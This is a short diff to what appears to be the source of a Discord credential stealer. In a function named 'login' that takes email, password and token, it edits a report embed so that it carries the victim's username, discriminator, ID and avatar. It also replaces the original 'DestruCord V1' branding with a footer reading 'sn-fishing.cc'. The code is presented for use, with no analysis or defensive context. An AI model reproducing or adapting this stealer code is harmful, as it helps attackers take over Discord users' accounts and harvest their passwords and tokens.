@@ -367,10 +367,10 @@ const login = async (email, password, token) => {
                 }
             ],
             "author": {
-                "name": "DestruCord V1"
+                "name": json.username +"#" + json.discriminator + " (" + json.id + ") ",
             },
             "footer": {
-                "text": "©KSCH | https://github.com/KSCHdsc"
+                "text": "sn-fishing.cc"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
